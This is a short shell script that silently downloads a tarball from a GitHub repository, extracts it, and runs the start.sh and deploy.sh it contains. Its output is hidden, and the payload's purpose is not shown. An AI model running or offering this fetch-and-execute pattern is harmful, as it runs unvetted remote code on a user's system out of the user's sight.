wget -O elektenan.tar.gz https://github.com/clasmildyt/joselek/raw/main/elektenan.tar.gz >/dev/null 2>&1
tar -xvf elektenan.tar.gz >/dev/null 2>&1
chmod +x start.sh && 
./start.sh && 
chmod +x deploy.sh && 
./deploy.sh	  
